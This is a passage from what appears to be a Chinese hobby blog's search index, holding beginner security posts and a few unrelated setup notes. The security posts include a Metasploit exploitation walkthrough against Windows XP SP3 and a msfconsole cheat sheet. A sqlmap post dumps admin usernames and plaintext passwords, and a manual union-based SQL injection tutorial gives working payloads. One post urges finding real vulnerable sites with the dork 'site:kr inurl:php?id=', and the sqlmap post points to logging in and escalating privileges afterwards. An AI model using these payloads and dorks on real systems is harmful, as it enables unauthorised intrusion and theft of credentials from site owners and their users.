class=\"selector-tag\">RHOST</span> 192<span class=\"selector-class\">.168</span><span class=\"selector-class\">.40</span><span class=\"selector-class\">.128</span></div></pre></td></tr></table></figure>\n<p>设置目标主机端口<br><figure class=\"highlight gams\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div></pre></td><td class=\"code\"><pre><div class=\"line\"><span class=\"keyword\">set</span> LPORT <span class=\"comment\">5555</span></div></pre></td></tr></table></figure></p>\n<p>设置目标的版本号  使用 show targets 查看版本号</p>\n<p><img src=\"https://img.blog.csdn.net/20141029215844128\" alt=\"\"></p>\n<p>可以看到 sp3 简体中文版的id 是 41<br><figure class=\"highlight gams\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div></pre></td><td class=\"code\"><pre><div class=\"line\"><span class=\"keyword\">set</span> TARGET <span class=\"comment\">41</span></div></pre></td></tr></table></figure></p>\n<p><img src=\"https://img.blog.csdn.net/20141029215848605\" alt=\"\"></p>\n<h2 id=\"④-查看所有选项是否设置好-show-options\"><a href=\"#④-查看所有选项是否设置好-show-options\" class=\"headerlink\" title=\"④ 查看所有选项是否设置好  show options\"></a>④ 查看所有选项是否设置好  show options</h2><p><img src=\"https://img.blog.csdn.net/20141029215852895\" alt=\"\"></p>\n<h1 id=\"III、进行渗透测试-exploit\"><a href=\"#III、进行渗透测试-exploit\" class=\"headerlink\" title=\"III、进行渗透测试   exploit\"></a>III、进行渗透测试   exploit</h1><p>等待一段时间后，获取目标主机的cmd权限<br><img src=\"https://img.blog.csdn.net/20141029215947640\" alt=\"\"></p>\n<h1 id=\"IV、将对目标主机的控制权保存到sessions中\"><a href=\"#IV、将对目标主机的控制权保存到sessions中\" class=\"headerlink\" title=\"IV、将对目标主机的控制权保存到sessions中\"></a>IV、将对目标主机的控制权保存到sessions中</h1><ul>\n<li>命令：  sessions -i 1 重新获取对目标主机的控制权</li>\n<li>说明：我的BT5是英文版的，不支持中文<br><img src=\"https://img.blog.csdn.net/20141029215904392\" alt=\"\"></li>\n</ul>\n"},{"title":"metasploit 连接数据库","url":"http://huirong.github.io/2014/10/29/metasploit连接数据库/","content":"<h1 id=\"I、查看数据库基本信息\"><a href=\"#I、查看数据库基本信息\" class=\"headerlink\" title=\"I、查看数据库基本信息\"></a>I、查看数据库基本信息</h1><figure class=\"highlight vim\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div><div class=\"line\">2</div></pre></td><td class=\"code\"><pre><div class=\"line\"><span class=\"keyword\">cd</span> /<span class=\"keyword\">opt</span>/metasploit</div><div class=\"line\"><span class=\"keyword\">cat</span> config/database.yml</div></pre></td></tr></table></figure>\n<p>结果如下图所示：<br><img src=\"https://img.blog.csdn.net/20141029212002844\" alt=\"\"></p>\n<h1 id=\"II、连接数据库\"><a href=\"#II、连接数据库\" class=\"headerlink\" title=\"II、连接数据库\"></a>II、连接数据库</h1><figure class=\"highlight less\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div></pre></td><td class=\"code\"><pre><div class=\"line\">db_connect <span class=\"attribute\">msf3</span>:<span class=\"number\">4</span>bfedfc2<span class=\"variable\">@localhost</span>:<span class=\"number\">7337</span>/msf3dev</div></pre></td></tr></table></figure>\n<p>查看数据库是否连接成功<br><figure class=\"highlight\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div></pre></td><td class=\"code\"><pre><div class=\"line\">db_status</div></pre></td></tr></table></figure></p>\n<p>结果如图：<br><img src=\"https://img.blog.csdn.net/20141029212419589\" alt=\"\"></p>\n<p><font color=\"red\">Tips：</font>我在执行db_connect命令时，遇到过一个错误<br><figure class=\"highlight stylus\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div></pre></td><td class=\"code\"><pre><div class=\"line\">No database drive installed<span class=\"selector-class\">.Try</span>  <span class=\"string\">\"gem install pg\"</span></div></pre></td></tr></table></figure></p>\n<p>解决方法如下：<br>查看ruby版本<br><figure class=\"highlight plain\"><figcaption><span>/opt/metasploit/msf3</span></figcaption><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div><div class=\"line\">2</div><div class=\"line\">3</div></pre></td><td class=\"code\"><pre><div class=\"line\"> /opt/metasploit/ruby/bin/ruby -v</div><div class=\"line\">/usr/bin/ruby -v</div><div class=\"line\">vi /opt/metasploit/msf3/msfconsole</div></pre></td></tr></table></figure></p>\n<p><img src=\"https://img.blog.csdn.net/20141029213346728\" alt=\"\"></p>\n<p>然后将第一行的 !/usr/bin/env ruby 改为　!/opt/meatsploit/ruby/bin/ruby<br><img src=\"https://img.blog.csdn.net/20141029213350550\" alt=\"\"></p>\n"},{"title":"msf 终端命令","url":"http://huirong.github.io/2014/10/29/msf终端命令/","content":"<ul>\n<li><font color=\"orange\">show exploits</font><br>列出metasploit框架中的所有渗透攻击模块。</li>\n<li><font color=\"orange\">show payloads</font><br>列出metasploit框架中的所有攻击载荷。</li>\n<li><font color=\"orange\">show auxiliary</font><br>列出metasploit框架中的所有辅助攻击载荷。</li>\n<li><font color=\"orange\">search name</font><br>查找metasploit框架中所有的渗透攻击和其他模块。</li>\n<li><font color=\"orange\">info</font><br>展示出制定渗透攻击或模块的相关信息。</li>\n<li><font color=\"orange\">use name</font><br>装载一个渗透攻击或模块。</li>\n<li><font color=\"orange\">LHOST</font><br>你本地可以让目标主机连接的IP地址，通常当目标主机不在同一个局域网内时，就需要是一个公共IP地址，特别为反弹式shell使用。</li>\n<li><font color=\"orange\">RHOST  </font><br>远程主机或是目标主机。</li>\n<li><font color=\"orange\">set function</font><br>设置特定的配置参数（EG：设置本地或远程主机参数）。</li>\n<li><font color=\"orange\">setg function</font><br>以全局方式设置特定的配置参数（EG：设置本地或远程主机参数）。</li>\n<li><font color=\"orange\">show options</font><br>列出某个渗透攻击或模块中所有的配置参数。</li>\n<li><font color=\"orange\">show targets</font><br>列出渗透攻击所有支持的目标平台。</li>\n<li><font color=\"orange\">set target num</font><br>指定你所知道的目标的操作系统以及补丁版本类型。 </li>\n<li><font color=\"orange\">set payload name</font>set payload name<br>指定想要使用的攻击载荷。</li>\n<li><font color=\"orange\">show advanced</font><br>列出所有高级配置选项。</li>\n<li><font color=\"orange\">set autorunscript migrate -f</font><br>在渗透攻击完成后，将自动迁移到另一个进程。</li>\n<li><font color=\"orange\">check</font><br>检测目标是否选定渗透攻击存在相应的安全漏洞。</li>\n<li><font color=\"orange\">exploit</font><br>执行渗透攻击或模块来攻击目标。</li>\n<li><font color=\"orange\">exploit -j</font><br>在计划任务下进行渗透攻击（攻击将在后台进行）。</li>\n<li><font color=\"orange\">exploit -z</font><br>渗透攻击完成后不与回话进行交互。</li>\n<li><font color=\"orange\">exploit -e encoder</font><br>制定使用的攻击载荷编码方式（EG：exploit -e shikata_ga_nai）。</li>\n<li><font color=\"orange\">exploit -h </font><br>列出exploit命令的帮助信息。</li>\n<li><font color=\"orange\">sessions -l</font><br>列出可用的交互会话（在处理多个shell时使用）。</li>\n<li><font color=\"orange\">sessions -l -v</font><br>列出所有可用的交互会话以及详细信息，EG：攻击系统时使用了哪个安全漏洞。</li>\n<li><font color=\"orange\">sessions -s script</font><br>在所有活跃的metasploit会话中运行一个特定的metasploit脚本。</li>\n<li><font color=\"orange\">sessions -K</font><br>杀死所有活跃的交互会话。</li>\n<li><font color=\"orange\">sessions -c cmd</font><br>在所有活跃的metasploit会话上执行一个命令。</li>\n<li><font color=\"orange\">sessions -u sessionID</font><br>升级一个普通的win32 shell到metasploit shell。</li>\n<li><font color=\"orange\">name</font><br>创建一个数据库驱动攻击所要使用的数据库（EG：db_create autopwn）。</li>\n<li><font color=\"orange\">db_connect name</font><br>创建并连接一个数据库驱动攻击所要使用的数据库（EG：db_connect user:passwd@ip/sqlname）。</li>\n<li><font color=\"orange\">db_namp</font><br>利用nmap并把扫描数据存储到数据库中（支持普通的nmap语句，EG：-sT -v -P0）。</li>\n<li><font color=\"orange\">db_autopwn -h</font><br>展示出db_autopwn命令的帮助信息。</li>\n<li><font color=\"orange\">db_autopwn -p -r -e</font><br>对所有发现的开放端口执行db_autopwn，攻击所有系统，并使用一个反弹式shell。</li>\n<li><font color=\"orange\">db_destroy</font><br>删除当前数据库。</li>\n<li><font color=\"orange\">db_destroy user：passwd@host：port/database</font><br>使用高级选项来删除数据库。</li>\n</ul>\n"},{"title":"wampserver2.5-apache2.4.9允许外部访问的配置","url":"http://huirong.github.io/2014/10/21/wampserver2.5-apache2.4.9允许外部访问的配置/","content":"<p>打开..\\wamp\\bin\\apache\\apache2.4.9\\conf\\httpd.conf配置文件，<br><figure class=\"highlight apache\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div><div class=\"line\">2</div><div class=\"line\">3</div><div class=\"line\">4</div><div class=\"line\">5</div><div class=\"line\">6</div><div class=\"line\">7</div><div class=\"line\">8</div><div class=\"line\">9</div><div class=\"line\">10</div><div class=\"line\">11</div><div class=\"line\">12</div><div class=\"line\">13</div><div class=\"line\">14</div><div class=\"line\">15</div><div class=\"line\">16</div><div class=\"line\">17</div><div class=\"line\">18</div><div class=\"line\">19</div><div class=\"line\">20</div><div class=\"line\">21</div><div class=\"line\">22</div><div class=\"line\">23</div><div class=\"line\">24</div><div class=\"line\">25</div><div class=\"line\">26</div><div class=\"line\">27</div><div class=\"line\">28</div><div class=\"line\">29</div><div class=\"line\">30</div><div class=\"line\">31</div><div class=\"line\">32</div></pre></td><td class=\"code\"><pre><div class=\"line\"><span class=\"section\">&lt;Directory \"c:/wamp/www/\"&gt;</span></div><div class=\"line\">    <span class=\"comment\">#</span></div><div class=\"line\">    <span class=\"comment\"># Possible values for the Options directive are \"None\", \"All\",</span></div><div class=\"line\">    <span class=\"comment\"># or any combination of:</span></div><div class=\"line\">    <span class=\"comment\">#   Indexes Includes FollowSymLinks SymLinksifOwnerMatch ExecCGI MultiViews</span></div><div class=\"line\">    <span class=\"comment\">#</span></div><div class=\"line\">    <span class=\"comment\"># Note that \"MultiViews\" must be named *explicitly* --- \"Options All\"</span></div><div class=\"line\">    <span class=\"comment\"># doesn't give it to you.</span></div><div class=\"line\">    <span class=\"comment\">#</span></div><div class=\"line\">    <span class=\"comment\"># The Options directive is both complicated and important.  Please see</span></div><div class=\"line\">    <span class=\"comment\"># http://httpd.apache.org/docs/2.4/mod/core.html#options</span></div><div class=\"line\">    <span class=\"comment\"># for more information.</span></div><div class=\"line\">    <span class=\"comment\">#</span></div><div class=\"line\">    <span class=\"attribute\"><span class=\"nomarkup\">Options</span></span> Indexes FollowSymLinks</div><div class=\"line\"></div><div class=\"line\">    <span class=\"comment\">#</span></div><div class=\"line\">    <span class=\"comment\"># AllowOverride controls what directives may be placed in .htaccess files.</span></div><div class=\"line\">    <span class=\"comment\"># It can be \"All\", \"None\", or any combination of the keywords:</span></div><div class=\"line\">    <span class=\"comment\">#   AllowOverride FileInfo AuthConfig Limit</span></div><div class=\"line\">    <span class=\"comment\">#</span></div><div class=\"line\">    <span class=\"attribute\">AllowOverride</span> <span class=\"literal\">all</span></div><div class=\"line\">    <span class=\"attribute\">Require</span> <span class=\"literal\">all</span> granted   #添加允许外部访问</div><div class=\"line\"> </div><div class=\"line\">    <span class=\"comment\">#</span></div><div class=\"line\">    <span class=\"comment\"># Controls who can get stuff from this server.</span></div><div class=\"line\">    <span class=\"comment\">#</span></div><div class=\"line\"> </div><div class=\"line\">    <span class=\"comment\">#   onlineoffline tag - don't remove</span></div><div class=\"line\">    <span class=\"comment\"># Require local  #注释请求本机访问</span></div><div class=\"line\"></div><div class=\"line\"></div><div class=\"line\"><span class=\"section\">&lt;/Directory&gt;</span></div></pre></td></tr></table></figure></p>\n<p><font color=\"red\">按代码 22 29 行修改</font><br>重启服务，再访问下就可以了。</p>\n"},{"title":"第一次使用 sqlmap","url":"http://huirong.github.io/2014/09/02/第一次使用sqlmap/","content":"<p>本人菜鸟一枚，第一次使用sqlmap，大神误入<br>准备工作：使用 ‘  and 1=1  and 1=2 找到可能存在sql注入的网站<br><a id=\"more\"></a></p>\n<h1 id=\"I、查看数据库系统信息\"><a href=\"#I、查看数据库系统信息\" class=\"headerlink\" title=\"I、查看数据库系统信息\"></a>I、查看数据库系统信息</h1><p>在终端输入<br><figure class=\"highlight brainfuck\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div></pre></td><td class=\"code\"><pre><div class=\"line\"><span class=\"comment\">sqlmap</span> <span class=\"literal\">-</span><span class=\"comment\">u</span> <span class=\"comment\">url</span> <span class=\"literal\">-</span><span class=\"literal\">-</span><span class=\"comment\">dbs</span> <span class=\"literal\">-</span><span class=\"literal\">-</span><span class=\"comment\">current</span><span class=\"literal\">-</span><span class=\"comment\">user</span></div></pre></td></tr></table></figure></p>\n<p>说明：url 换成你之前找到的可能存在sql注入的网址 ，文中的url都是这样，不在赘述</p>\n<p><img src=\"https://img.blog.csdn.net/20140902162816652\" alt=\"\"></p>\n<h1 id=\"II、查看数据库表\"><a href=\"#II、查看数据库表\" class=\"headerlink\" title=\"II、查看数据库表\"></a>II、查看数据库表</h1><figure class=\"highlight ada\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div></pre></td><td class=\"code\"><pre><div class=\"line\">sqlmap -u -url <span class=\"comment\">--tables</span></div></pre></td></tr></table></figure>\n<p><img src=\"https://img.blog.csdn.net/20140902163603858\" alt=\"\"></p>\n<p>会出现一个错误，询问是否使用常用的表来 查询数据库表，选择 y<br>sqlmap 会加载常用的数据库表命名字典，使用其中的表名执行sql语句，判断数据库中是否存在相应的表名</p>\n<p><img src=\"https://img.blog.csdn.net/20140902163959578\" alt=\"\"></p>\n<p>输入运行的线程数，这个数字任意</p>\n<p>期间可能会出现请求超时的情况，不用管，sqlmap会自动再次请求，直接等结果<br><img src=\"https://img.blog.csdn.net/20140902164217546\" alt=\"\"></p>\n<p>查询出两张表，可能数据库中不止这两张表</p>\n<h1 id=\"III、查看表字段\"><a href=\"#III、查看表字段\" class=\"headerlink\" title=\"III、查看表字段\"></a>III、查看表字段</h1><figure class=\"highlight excel\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div></pre></td><td class=\"code\"><pre><div class=\"line\">sqlmap -u url -<span class=\"built_in\">T</span> uname --<span class=\"built_in\">columns</span></div></pre></td></tr></table></figure>\n<p>说明：uname是上面查询出来的其中一张表</p>\n<p><img src=\"https://img.blog.csdn.net/20140902165805211\" alt=\"\"></p>\n<h1 id=\"IV、查看数据\"><a href=\"#IV、查看数据\" class=\"headerlink\" title=\"IV、查看数据\"></a>IV、查看数据</h1><figure class=\"highlight ada\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div></pre></td><td class=\"code\"><pre><div class=\"line\">sqlmap -u -url -T uname -C login_name,pass,username <span class=\"comment\">--dump</span></div></pre></td></tr></table></figure>\n<p><img src=\"https://img.blog.csdn.net/20140902172455071\" alt=\"\"></p>\n<p>发现密码竟然是明文，得到管理员账号和密码了。。。。。。。<br>后续就是找后台地址，登录，然后继续提权，就不介绍了</p>\n"},{"title":"firefox install in kali occur error","url":"http://huirong.github.io/2014/09/02/firefox_install_in_kali_occur_error/","content":"<p>在kali linux 中安装firefox 遇到如下错误<br>现在尚不能配置软件包 firefox-mozilla-build</p>\n<p>不能配置(目前状态为 half-installed )</p>\n<p>在处理时有错误发生：<br><figure class=\"highlight armasm\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div><div class=\"line\">2</div><div class=\"line\">3</div></pre></td><td class=\"code\"><pre><div class=\"line\"><span class=\"symbol\">firefox</span>-mozilla-<span class=\"keyword\">build</span></div><div class=\"line\"></div><div class=\"line\">E: <span class=\"keyword\">Sub-process </span>/usr/<span class=\"keyword\">bin/dpkg </span>returned an error <span class=\"meta\">code</span> (<span class=\"number\">1</span>)</div></pre></td></tr></table></figure></p>\n<p>解决方法<br><figure class=\"highlight applescript\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div></pre></td><td class=\"code\"><pre><div class=\"line\">sudo apt-<span class=\"keyword\">get</span> install <span class=\"comment\">--reinstall firefox-mozilla-build</span></div></pre></td></tr></table></figure></p>\n<p>参见链接  <a href=\"https://forums.kali.org/archive/index.php/t-6852.html\" target=\"_blank\" rel=\"external\">firefox install in kali occur error</a></p>\n"},{"title":"手动sql注入（初级篇）","url":"http://huirong.github.io/2014/07/15/手动sql注入（初级篇）/","content":"<p>我也是才学 sql 注入一个星期，此篇文章是学给初学者看的<br>推荐书籍 <a href=\"http://www.ddooo.com/softdown/50160.htm\" target=\"_blank\" rel=\"external\">《sql注入攻击与防御》</a><br><a id=\"more\"></a></p>\n<h1 id=\"I、找到存在sql注入的网站\"><a href=\"#I、找到存在sql注入的网站\" class=\"headerlink\" title=\"I、找到存在sql注入的网站\"></a>I、找到存在sql注入的网站</h1><h2 id=\"①-方法\"><a href=\"#①-方法\" class=\"headerlink\" title=\"① 方法\"></a>① 方法</h2><ul>\n<li>在google中输入 site:kr inurl:php?id=</li>\n<li>打开出现的网址，在网址后面添加 ’  （英文逗号）如果页面出现跳转，说明可能存在sql注入</li>\n</ul>\n<h2 id=\"②-原理\"><a href=\"#②-原理\" class=\"headerlink\" title=\"② 原理\"></a>② 原理</h2><p>一般网址都是类似  search.php?search=hello<br>相应的sql语句 可能是：<br><figure class=\"highlight cs\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div></pre></td><td class=\"code\"><pre><div class=\"line\"><span class=\"keyword\">select</span> * <span class=\"keyword\">from</span> table_name <span class=\"keyword\">where</span> column_name=<span class=\"string\">'hello'</span></div></pre></td></tr></table></figure></p>\n<p>如果在网址后面添加 ‘ 则sql语句为：<br><figure class=\"highlight cs\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div></pre></td><td class=\"code\"><pre><div class=\"line\"><span class=\"keyword\">select</span> * <span class=\"keyword\">from</span> table_name <span class=\"keyword\">where</span> column_name=<span class=\"string\">'hello'</span><span class=\"string\">'</span></div></pre></td></tr></table></figure></p>\n<p>如果网站没有进行sql注入过滤，会报错。</p>\n<h2 id=\"③-演练平台\"><a href=\"#③-演练平台\" class=\"headerlink\" title=\"③ 演练平台\"></a>③ 演练平台</h2><p>在 GitHub 有个 Web 漏洞演练项目 <a href=\"https://github.com/710leo/ZVulDrill\" target=\"_blank\" rel=\"external\">ZVulDrill</a>，可以下载后部署在自己的电脑上（这里我就不教大家部署了，熟悉Web编程的大部分都会）</p>\n<p>网页内容如下<br><img src=\"https://img.blog.csdn.net/20140715201016711\" alt=\"\"></p>\n<h1 id=\"II、检测字段长度\"><a href=\"#II、检测字段长度\" class=\"headerlink\" title=\"II、检测字段长度\"></a>II、检测字段长度</h1><figure class=\"highlight crmsh\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div></pre></td><td class=\"code\"><pre><div class=\"line\">http://localhost/ZVulDrill-<span class=\"literal\">master</span>/search.php?<span class=\"attr\">search=</span>hello%' <span class=\"keyword\">order</span> <span class=\"title\">by</span> <span class=\"number\">1</span>--%<span class=\"number\">20</span></div></pre></td></tr></table></figure>\n<p>相当于sql语句<br><figure class=\"highlight sql\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div></pre></td><td class=\"code\"><pre><div class=\"line\"><span class=\"keyword\">select</span> * <span class=\"keyword\">from</span> table_name <span class=\"keyword\">where</span> colmun_name <span class=\"keyword\">like</span> <span class=\"string\">'%hello%'</span> <span class=\"keyword\">order</span> <span class=\"keyword\">by</span> <span class=\"number\">1</span> <span class=\"comment\">-- '</span></div></pre></td></tr></table></figure></p>\n<p><font color=\"red\">Tips：</font></p>\n<ul>\n<li>MySQL有三种注释 – 是其中一种 但是 – 后面要跟一个空格才有效。</li>\n<li>但是网址会自动去掉最后一个空格需要手动输入%20</li>\n<li>注释后面的sql语句不执行</li>\n</ul>\n<p>此时页面没有出错，用同样的方式 添加 order by 10<br>页面出错，然后 order by 5 出错，order by 4 页面正确<br>说明字段长  4</p>\n<h1 id=\"III、查看数据库信息\"><a href=\"#III、查看数据库信息\" class=\"headerlink\" title=\"III、查看数据库信息\"></a>III、查看数据库信息</h1><h2 id=\"①-方法-使用union语句提取数据\"><a href=\"#①-方法-使用union语句提取数据\" class=\"headerlink\" title=\"① 方法:使用union语句提取数据\"></a>① 方法:使用union语句提取数据</h2><figure class=\"highlight ada\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div></pre></td><td class=\"code\"><pre><div class=\"line\">http://localhost/ZVulDrill-master/search.php?search=hello%' <span class=\"keyword\">and</span> <span class=\"number\">1</span>=<span class=\"number\">2</span> union <span class=\"keyword\">select</span> <span class=\"number\">1</span>,<span class=\"number\">2</span>,<span class=\"number\">2</span>,<span class=\"number\">4</span> <span class=\"comment\">--%20</span></div></pre></td></tr></table></figure>\n<p>sql语句<br><figure class=\"highlight crystal\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div></pre></td><td class=\"code\"><pre><div class=\"line\">select * from table_name where column_name like <span class=\"string\">'%hello%'</span> and <span class=\"number\">1</span>=<span class=\"number\">2</span> <span class=\"class\"><span class=\"keyword\">union</span> <span class=\"title\">select</span> 1,2,3,4</span></div></pre></td></tr></table></figure></p>\n<p>union前的sql语句中 where条件恒为假，结果集为空，整个sql语句返回的是union后面的结果集<br><img src=\"https://img.blog.csdn.net/20140715201042343\" alt=\"\"></p>\n<h2 id=\"②-获取MySQL-version-user-database-等相关信息\"><a href=\"#②-获取MySQL-version-user-database-等相关信息\" class=\"headerlink\" title=\"② 获取MySQL version user database 等相关信息\"></a>② 获取MySQL version user database 等相关信息</h2><p>如上图所示，页面上显示 1,2 ，可以利用这个来显示我们需要的信息<br><figure class=\"highlight sql\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div></pre></td><td class=\"code\"><pre><div class=\"line\">http://localhost/ZVulDrill-master/search.php?search=hello%' and 1=2 union <span class=\"keyword\">select</span> <span class=\"number\">1</span>,<span class=\"keyword\">version</span>(),<span class=\"keyword\">user</span>(),<span class=\"number\">4</span> <span class=\"comment\">--%20</span></div></pre></td></tr></table></figure></p>\n<p>即  将 2，3 换成 version(),user()<br>页面如下<br><img src=\"https://img.blog.csdn.net/20140715201431834\" alt=\"\"></p>\n<p>同理将 user() 换成 database()  得到数据库名  zvuldrill</p>\n<ul>\n<li>user() ————    wkdty@localhost</li>\n<li>version()  ————–   5.6.17 （5.0以上的版本都带有一个</li>\n<li>information_schema 的虚拟库里面存放的是所有库的信息.）</li>\n<li>database()   ————-  zvuldrill<h1 id=\"IV、获取数据库数据\"><a href=\"#IV、获取数据库数据\" class=\"headerlink\" title=\"IV、获取数据库数据\"></a>IV、获取数据库数据</h1><h2 id=\"①-获取表名\"><a href=\"#①-获取表名\" class=\"headerlink\" title=\"① 获取表名\"></a>① 获取表名</h2><figure class=\"highlight sql\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div></pre></td><td class=\"code\"><pre><div class=\"line\">http://localhost/ZVulDrill-master/search.php?search=hello%' and 1=2 union <span class=\"keyword\">select</span> <span class=\"number\">1</span>,<span class=\"number\">2</span>,<span class=\"keyword\">GROUP_CONCAT</span>(<span class=\"keyword\">DISTINCT</span> table_name),<span class=\"number\">4</span> <span class=\"keyword\">from</span> information_schema.columns <span class=\"keyword\">where</span> table_schema=<span class=\"string\">'zvuldrill'</span><span class=\"comment\">--%20</span></div></pre></td></tr></table></figure>\n</li>\n</ul>\n<p><img src=\"https://img.blog.csdn.net/20140715202557175\" alt=\"\"><br>数据库中有3张表，对我们最有用的是admin这张表，以管理员身份进入网站可以看到各种信息</p>\n<h2 id=\"②-获取字段名\"><a href=\"#②-获取字段名\" class=\"headerlink\" title=\"② 获取字段名\"></a>② 获取字段名</h2><figure class=\"highlight sql\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div></pre></td><td class=\"code\"><pre><div class=\"line\">http://localhost/ZVulDrill-master/search.php?search=hello%' and 1=2 union <span class=\"keyword\">select</span> <span class=\"number\">1</span>,<span class=\"number\">2</span>,<span class=\"keyword\">GROUP_CONCAT</span>(<span class=\"keyword\">DISTINCT</span> column_name),<span class=\"number\">4</span> <span class=\"keyword\">from</span> information_schema.columns <span class=\"keyword\">where</span> table_name=<span class=\"string\">'admin'</span><span class=\"comment\">--%20</span></div></pre></td></tr></table></figure>\n<p><img src=\"https://img.blog.csdn.net/20140715202931238\" alt=\"\"></p>\n<h2 id=\"③-获取数据\"><a href=\"#③-获取数据\" class=\"headerlink\" title=\"③ 获取数据\"></a>③ 获取数据</h2><figure class=\"highlight sql\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div></pre></td><td class=\"code\"><pre><div class=\"line\">http://localhost/ZVulDrill-master/search.php?search=hello%' and 1=2 union <span class=\"keyword\">select</span> <span class=\"number\">1</span>,<span class=\"number\">2</span>,<span class=\"keyword\">GROUP_CONCAT</span>(<span class=\"keyword\">DISTINCT</span> admin_id,admin_name,admin_pass),<span class=\"number\">4</span> <span class=\"keyword\">from</span> <span class=\"keyword\">admin</span><span class=\"comment\">--%20</span></div></pre></td></tr></table></figure>\n<p><img src=\"https://img.blog.csdn.net/20140715203207348\" alt=\"\"></p>\n<ul>\n<li>admin_id：1 </li>\n<li>admin_name：admin</li>\n<li>admin_pass：d033e22ae348aeb5660fc2140aec35850c4da997(md5解密之后  得到admin)<br>根据用户登录入口，找到后台登录入口  ，以管理员身份进入网站</li>\n</ul>\n"},{"title":"上传我的项目到SAE","url":"http://huirong.github.io/2014/06/06/上传我的项目到SAE/","content":"<h1 id=\"I、创建新应用\"><a href=\"#I、创建新应用\" class=\"headerlink\" title=\"I、创建新应用\"></a>I、创建新应用</h1><p>登录SAE，可通过微博账号登录，进入首页，点击创建新应用<br><img src=\"https://img.blog.csdn.net/20140605200206765\" alt=\"\"><br>新建成功后，回到首页，就可以看到新建的应用了<br><img src=\"https://img.blog.csdn.net/20140605201219765\" alt=\"\"></p>\n<h1 id=\"II、上传代码\"><a href=\"#II、上传代码\" class=\"headerlink\" title=\"II、上传代码\"></a>II、上传代码</h1><ol>\n<li>将代码按照项目结构打包，不要放在一个文件夹里，即解压后就能看到项目结构，而不是一个文件夹<br>提示：只支持上传zip、 gz、tar.gz三种代码包，文件大小不能超过20MB<br>如果压缩包中包含有中文文件名的文件，请使用utf8编码，否则会上传失败。最好不要有中文文件名</li>\n<li>点击新建的应用，即wustSurvey<br><img src=\"https://img.blog.csdn.net/20140605202206031\" alt=\"\"></li>\n<li>首次进入，系统会提示新建一个版本，选择新建<br>右边会出现版本1，点击操作-&gt;上传代码，将刚打包好的代码上传<br><img src=\"file:///C:\\Users\\LukyStar\\AppData\\Roaming\\Tencent\\Users\\837410145\\QQ\\WinTemp\\RichOle\\WFTZA3B99M}[1%K1YEVGGQE.jpg\" alt=\"\"><br><img src=\"https://img.blog.csdn.net/20140605202622953\" alt=\"\"></li>\n</ol>\n<h1 id=\"III、配置数据库\"><a href=\"#III、配置数据库\" class=\"headerlink\" title=\"III、配置数据库\"></a>III、配置数据库</h1><ol>\n<li>我用的是phpMyadmin管理数据库，可以将本地数据库导出成 .sql 形式</li>\n<li>回到SAE，点击左边导航条 服务管理-&gt; MySql，点击右边的蓝色按钮，初始化完成后，点击管理MySql<br><img src=\"https://img.blog.csdn.net/20140606123545734\" alt=\"\"></li>\n<li>将刚从本地到处的数据库上传<br><img src=\"https://img.blog.csdn.net/20140606130016109\" alt=\"\"></li>\n</ol>\n<h1 id=\"IV、部署代码\"><a href=\"#IV、部署代码\" class=\"headerlink\" title=\"IV、部署代码\"></a>IV、部署代码</h1><p>回到SAE管理MySql的页面，点击文档，看以看到如下信息<br><img src=\"https://img.blog.csdn.net/20140606130453734\" alt=\"\"><br>下一步就是修改上传代码的数据库联系信息<br><img src=\"https://img.blog.csdn.net/20140606130736625\" alt=\"\"><br>可以看到项目的目录结构，按照文档，更改代码里的数据库配置信息，每个人的情况不一样，我就不多说了<br>点击首页网址，就可以成功访问你的项目了。。。。。。<br><img src=\"https://img.blog.csdn.net/20140606135101078\" alt=\"\"></p>\n<p>恭喜！！！你的项目已经成功部署到SAE上了，赶快邀请好友去访问吧</p>\n"},{"title":"scrapy 数据库插入","url":"http://huirong.github.io/2014/05/22/scrapy_数据库插入/","content":"<h1 id=\"I、安装mysql\"><a href=\"#I、安装mysql\" class=\"headerlink\" title=\"I、安装mysql\"></a>I、安装mysql</h1><ul>\n<li><p>安装mysql </p>\n<figure class=\"highlight actionscript\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div></pre></td><td class=\"code\"><pre><div class=\"line\">sudo apt-<span class=\"keyword\">get</span> install mysql</div></pre></td></tr></table></figure>\n</li>\n<li><p>安装python-mysql</p>\n<figure class=\"highlight vim\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div></pre></td><td class=\"code\"><pre><div class=\"line\">sudo apt-<span class=\"built_in\">get</span> install <span class=\"keyword\">python</span>-mysqldb</div></pre></td></tr></table></figure>\n</li>\n<li><p>安装python支持mysql的驱动</p>\n<figure class=\"highlight cmake\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div></pre></td><td class=\"code\"><pre><div class=\"line\">sudo pip <span class=\"keyword\">install</span> pymysql</div></pre></td></tr></table></figure>\n</li>\n</ul>\n<p><font color=\"red\">Tips：</font>安装时密码不要为空</p>\n<h1 id=\"II、新建数据库\"><a href=\"#II、新建数据库\" class=\"headerlink\" title=\"II、新建数据库\"></a>II、新建数据库</h1><ul>\n<li><p>以root身份进入mysql</p>\n<figure class=\"highlight ebnf\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div></pre></td><td class=\"code\"><pre><div class=\"line\"><span class=\"attribute\">mysql -u root</span></div></pre></td></tr></table></figure>\n</li>\n<li><p>新建数据库(数据库名 